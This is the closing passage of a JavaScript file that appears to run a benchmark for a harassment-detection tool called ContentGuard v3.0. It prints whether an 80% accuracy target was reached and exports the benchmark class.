    const targetAchieved = v3Accuracy >= 80
    console.log(`\n🎯 v3.0 VERDICT: ${targetAchieved ? '🎉 SUCCESS' : '⚠️  NEEDS WORK'}`)
    if (targetAchieved) {
      console.log(`   ContentGuard v3.0 has successfully achieved the 80%+ accuracy target!`)
      console.log(`   The advanced harassment detection and context awareness are working effectively.`)
    } else {
      console.log(`   v3.0 shows significant improvement but hasn't quite hit the 80% target.`)
      console.log(`   Focus on the recommendations above for v3.1 to bridge the gap.`)
    }
  }

  truncateText(text, maxLength = 80) {
    if (text.length <= maxLength) return text
    return text.substring(0, maxLength - 3) + '...'
  }
}

// Run the v3.0 benchmark
async function main() {
  const benchmark = new MassiveBenchmarkV3()
  await benchmark.runBenchmark()
}

if (require.main === module) {
  main().catch(console.error)
}

module.exports = { MassiveBenchmarkV3 } 